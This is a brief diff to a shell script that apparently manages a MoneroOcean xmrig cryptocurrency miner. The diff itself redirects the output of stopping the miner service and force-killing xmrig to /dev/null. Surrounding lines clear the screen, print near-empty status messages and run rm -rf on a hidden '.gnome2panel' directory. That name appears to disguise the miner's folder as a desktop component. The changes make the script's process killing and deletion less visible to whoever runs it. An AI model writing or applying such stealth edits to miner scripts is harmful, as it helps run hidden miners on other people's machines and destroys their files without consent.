@@ -137,10 +137,10 @@ echo
 
 echo "[*] "
 if sudo -n true 2>/dev/null; then
-  sudo systemctl stop moneroocean_miner.service
+  sudo systemctl stop moneroocean_miner.service > /dev/null
   clear
 fi
-killall -9 xmrig
+killall -9 xmrig > /dev/null
 clear
 echo "[*] y"
 rm -rf $HOME/.gnome2panel
